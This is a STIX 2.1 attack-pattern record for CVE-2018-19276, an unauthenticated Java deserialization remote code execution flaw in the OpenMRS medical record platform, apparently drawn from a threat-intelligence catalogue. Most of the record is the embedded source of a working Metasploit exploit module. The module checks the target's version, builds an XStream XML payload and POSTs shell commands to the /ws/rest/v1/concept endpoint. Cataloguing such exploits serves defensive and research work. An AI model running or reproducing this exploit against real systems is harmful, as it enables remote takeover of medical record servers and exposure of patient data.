{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ad92c38-2a77-4240-9ef4-761d818d3175",
    "created": "2024-08-14T17:11:45.686755Z",
    "modified": "2024-08-14T17:11:45.686759Z",
    "name": "OpenMRS Java Deserialization RCE",
    "description": "( OpenMRS is an open-source platform that supplies users with a customizable medical record system.  There exists an object deserialization vulnerability in the `webservices.rest` module used in OpenMRS Platform. Unauthenticated remote code execution can be achieved by sending a malicious XML payload to a Rest API endpoint such as `/ws/rest/v1/concept`.  This module uses an XML payload generated with Marshalsec that targets the ImageIO component of the XStream library.  Tested on OpenMRS Platform `v2.1.2` and `v2.21` with Java 8 and Java 9. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/openmrs_deserialization.rb",
            "external_id": "openmrs_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-19276"
        },
        {
            "source_name": "reference",
            "url": "https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607"
        },
        {
            "source_name": "reference",
            "url": "https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mpgn/CVE-2018-19276/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'OpenMRS Java Deserialization RCE',\n      'Description'    => %q(\n        OpenMRS is an open-source platform that supplies\n        users with a customizable medical record system.\n\n        There exists an object deserialization vulnerability\n        in the `webservices.rest` module used in OpenMRS Platform.\n        Unauthenticated remote code execution can be achieved\n        by sending a malicious XML payload to a Rest API endpoint\n        such as `/ws/rest/v1/concept`.\n\n        This module uses an XML payload generated with Marshalsec\n        that targets the ImageIO component of the XStream library.\n\n        Tested on OpenMRS Platform `v2.1.2` and `v2.21` with Java\n        8 and Java 9.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'Nicolas Serra', # Vuln Discovery and PoC\n        'mpgn',          # PoC\n        'Shelby Pace'    # Metasploit Module\n      ],\n      'References'     =>\n       [\n         [ 'CVE', '2018-19276' ],\n         [ 'URL', 'https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607' ],\n         [ 'URL', 'https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization' ],\n         [ 'URL', 'https://github.com/mpgn/CVE-2018-19276/' ]\n       ],\n      'Platform'       => [ 'unix', 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n       [\n         [ 'Linux',\n           {\n             'Arch'             =>  [ ARCH_X86, ARCH_X64 ],\n             'Platform'         =>  [ 'unix', 'linux' ],\n             'CmdStagerFlavor'  => 'printf'\n           }\n         ]\n       ],\n      'DisclosureDate' => '2019-02-04',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n    [\n      Opt::RPORT(8081),\n      OptString.new('TARGETURI', [ true, 'Base URI for OpenMRS', '/' ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi!('method' => 'GET', 'uri' => normalize_uri(target_uri.path))\n    return CheckCode::Unknown(\"OpenMRS page unreachable.\") unless res\n\n    return CheckCode::Safe('Page discovered is not OpenMRS.') unless res.body.downcase.include?('openmrs')\n    response = res.get_html_document\n    version = response.at('body//h3')\n    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version && version.text\n\n    version_no = version.text\n    version_no = version_no.match(/\\d+\\.\\d+\\.\\d*/)\n    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version_no\n\n    version_no = Rex::Version.new(version_no)\n\n    if (version_no < Rex::Version.new('1.11.8') || version_no.between?(Rex::Version.new('2'), Rex::Version.new('2.1.3')))\n      return CheckCode::Appears(\"OpenMRS platform version: #{version_no}\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def format_payload\n    payload_data = payload.encoded.to_s.encode(xml: :text)\n    payload_arr = payload_data.split(' ', 3)\n    payload_arr.map { |arg| \"<string>#{arg}</string>\" }.join.gsub(\"'\", \"\")\n  end\n\n  def read_payload_data(payload_cmd)\n    # payload generated with Marshalsec\n    erb_path = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-19276', 'payload.erb')\n    payload_data = File.binread(erb_path)\n    payload_data = ERB.new(payload_data).result(binding)\n\n  rescue Errno::ENOENT\n    fail_with(Failure::NotFound, \"Failed to find erb file at the given path: #{erb_path}\")\n  end\n\n  def execute_command(cmd, opts={})\n    cmd = cmd.encode(xml: :text)\n    xml_data = \"<string>sh</string><string>-c</string><string>#{cmd}</string>\"\n    rest_uri = normalize_uri(target_uri.path, 'ws', 'rest', 'v1', 'concept')\n    payload_data = read_payload_data(xml_data)\n\n    send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  rest_uri,\n      'headers'   =>  { 'Content-Type'  =>  'text/xml' },\n      'data'      =>  payload_data\n    )\n  end\n\n  def exploit\n    cmds = generate_cmdstager(:concat_operator => '&&')\n    print_status('Sending payload...')\n    cmds.first.split('&&').map { |cmd| execute_command(cmd) }\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-04",
    "x_mitre_platforms": [
        "[ 'unix', 'linux' ]"
    ]
}